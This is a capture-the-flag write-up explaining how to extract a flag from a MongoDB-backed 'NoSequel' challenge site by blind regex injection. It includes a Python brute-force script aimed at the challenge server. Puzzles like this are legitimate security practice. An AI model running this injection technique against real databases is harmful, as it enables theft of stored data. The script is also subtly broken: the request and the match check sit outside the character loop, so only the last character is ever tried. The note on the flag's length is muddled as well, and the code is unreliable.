# NoSequel
This site is a database with two collections; movies for searching for movies without a sequel & flags for searching for flags. Searching for any query in the flags collections returns:
```html
Error
Only regex queries are supported on the flag collection.
```
A quick Google search for the provided syntax and "NoSQL" points towards this being a MongoDB database. The syntax for a MongoDB regex query is:
```mql
{ <field>: { $regex: /pattern/, $options: '<options>'} }
```
We can test this with the following query in the flags collection:
```mql
flag: { $regex: flag{ }
```
From this, we should see `result: Pattern matched`, we know this should match because all flags begin with `flag{`. Now, if we make this query and capture the post request that is made to `/search`, we can see the accepted parameters. This allows us to craft a script to automatically figure out the flag:
```python
import requests
from string import ascii_lowercase, digits

url = "http://challenge.nahamcon.com:30769/search"
charset = ascii_lowercase + digits
known_text = "flag{"

while len(known_text) < 37:
	for char in charset:
		payload = {
			"query": "flag: { $regex:" + known_text + char + "}",
			"collection": 'flags'
		}
	response = requests.post(url, data=payload)
	if "Pattern matched" in response.text:
		known_text += char
		print(f"Built string: {known_text}")
	else:
		continue
```
This will iterate through all lowercase ASCII characters and digits 0-9 for each position in the flag. We are using `while len(known_text) < 37` because we know all flags are 32 characters minus the five characters for `flag{`.
